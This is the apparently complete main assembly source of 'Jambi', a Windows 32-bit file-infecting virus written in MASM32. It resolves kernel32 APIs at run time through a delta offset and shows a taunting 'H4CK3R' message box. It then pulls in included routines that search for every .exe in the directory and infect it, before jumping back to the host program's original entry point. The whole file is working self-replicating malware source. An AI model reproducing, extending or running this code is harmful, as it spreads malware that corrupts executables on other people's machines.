; Jambi
; MASM32 asm program for Intel i386 processors running Windows 32bits
; By Deb0ch.

.386
.model flat, stdcall
option casemap:none

include	\masm32\include\windows.inc
include	\masm32\include\kernel32.inc

.code

begin_copy:

; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�
; DATA (inside .code section)
; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�

    oldEntryPoint           dd 0
    msgOfVictory            db "H4 h4 h4, J3 5u15 1 H4CK3R !!!", 0

    kernel32_dll_name       db "Kernel32.dll", 0
    user32_dll_name         db "User32.dll", 0
    getProcAddress_name     db "GetProcAddress", 0
    loadLibrary_name        db "LoadLibraryA", 0

	file_regex				db "*.exe", 0

; Function names
	closehandle_name		db "CloseHandle", 0
	createfile_name			db "CreateFileA", 0
	findclose_name			db "FindClose", 0
	findfirstfile_name		db "FindFirstFileA", 0
	findnextfile_name		db "FindNextFileA", 0
	getfilesize_name		db "GetFileSize", 0
    messagebox_name         db "MessageBoxA", 0
	readfile_name			db "ReadFile", 0
	setfilepointer_name		db "SetFilePointer", 0
    virtualalloc_name       db "VirtualAlloc", 0
	virtualfree_name		db "VirtualFree", 0
	writefile_name			db "WriteFile", 0

; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�
; DATA (inside .code section) - END
; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�



; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�
; PROCEDURES
; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�

include	utils.asm
include	infect_file.asm

; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�
; PROCEDURES - END
; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�


; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�
; eax: reserved for proc and func return values.
; ebx: delta offset
; esi: Parsing pointer. Keeps track of where we need to be in the PE.
; いいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいいい�

start: ; *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** ENTRY *** 

    mov     esi, [esp]                  ; Look for last eip which was in kernel32.dll, and is now on the stack because of the call from there.

main PROC NEAR

    LOCAL   getProcAddress_addr:DWORD
	LOCAL	loadLibrary_addr:DWORD
	LOCAL	imageBase:DWORD
	LOCAL	filehandle:DWORD
	LOCAL	fileptr:DWORD
	LOCAL	filesearchhandle:DWORD
	LOCAL	filesize:DWORD
	LOCAL	win32finddata:WIN32_FIND_DATA

; Function addresses
	LOCAL	closehandle_addr:DWORD
	LOCAL	createfile_addr:DWORD
	LOCAL	findclose_addr:DWORD
	LOCAL	findfirstfile_addr:DWORD
	LOCAL	findnextfile_addr:DWORD
	LOCAL	getfilesize_addr:DWORD
	LOCAL	messagebox_addr:DWORD
	LOCAL	readfile_addr:DWORD
	LOCAL	setfilepointer_addr:DWORD
	LOCAL	virtualalloc_addr:DWORD
	LOCAL	virtualfree_addr:DWORD
	LOCAL	writefile_addr:DWORD

    call    delta_offset				; Get delta offset for position independence.
delta_offset:
    pop     ebx
    sub     ebx, delta_offset           ; now ebx == delta offset. Add it to any address which is inside this program to be position independent.

include	search_k32.asm								; Search Kernel32.dll base address and resolves GetProcAddress and LoadLibraryA function addresses.

; Loads a function from a dll using GetProcAddress and LoadLibrary that we just got from kernel32.dll.
; Can be used ONLY within main procedure.
LOADFUNC	MACRO	fct_name, dll_name, result_container
    lea     edx, [ebx + offset dll_name]		    ;
    push    edx                                     ;
    call    loadLibrary_addr                        ;
    lea     edx, [ebx + offset fct_name]     		;
    push    edx                                     ;
    push    eax                                     ;
    call    getProcAddress_addr                     ;
    mov     result_container, eax                   ; Sequence of instructions to load a function from a dll.
ENDM

; Load your functions here.

	LOADFUNC	closehandle_name,	kernel32_dll_name,	closehandle_addr
	LOADFUNC	createfile_name,	kernel32_dll_name,	createfile_addr
	LOADFUNC	findclose_name,		kernel32_dll_name,	findclose_addr
	LOADFUNC	findfirstfile_name,	kernel32_dll_name,	findfirstfile_addr
	LOADFUNC	findnextfile_name,	kernel32_dll_name,	findnextfile_addr
	LOADFUNC	getfilesize_name,	kernel32_dll_name,	getfilesize_addr
	LOADFUNC	messagebox_name,	user32_dll_name,	messagebox_addr
	LOADFUNC	readfile_name,		kernel32_dll_name,	readfile_addr
	LOADFUNC	setfilepointer_name,kernel32_dll_name,	setfilepointer_addr
	LOADFUNC	virtualalloc_name,	kernel32_dll_name,	virtualalloc_addr
	LOADFUNC	virtualfree_name,	kernel32_dll_name,	virtualfree_addr
	LOADFUNC	writefile_name,		kernel32_dll_name,	writefile_addr

; functions loading end.

    push    0                           			;
	lea		ecx, [ebx + offset msgOfVictory]		;
    push    ecx										;
    push    ecx         							;
    push    0                           			;
    call    messagebox_addr             			; Msgbox of VICTORY !!!

; --------------------------------------> Now, time to infect the other files ! Niark niark niark...

include	search_files.asm	; Loop for searching and infecting all exe files in the directory.

	mov		ecx, [ebx + oldEntryPoint]	; Load the old entry point RVA.
	cmp		ecx, 0
	je		exit						; oldEntryPoint = 0 <=> it is the seed file and there is nowhere to jump after.

	call	search_imgbase_get_eip
search_imgbase_get_eip:
	pop		esi							; esi -> somewhere inside our program (here).
    and     esi, 0FFFF0000h             ; mask address inside our program to get page aligned like sections.
    cmp     word ptr [esi], "ZM"
	je		search_imgbase_end
search_imgbase:
    sub     esi, 01000h					; Going back and back, keeping the page/section alignment.
    cmp     word ptr [esi], "ZM"        ; Looking for the "MZ" signature of a DOS header. "ZM" for endianess.
    jne     search_imgbase
search_imgbase_end:
	add		esi, ecx					; add real ImgBase to oldEntryPoint RVA to make a VA.

	leave								; Epilogue. Because of the jmp, the epilogue of the current procedure will never be executed, therefore this one is here.
	jmp		esi							; Jump to currently executed infected file's original entry. If it is the virus seed, it is just a jump to end_copy.

exit:
	ret
main ENDP

end_copy:
	ret
end start
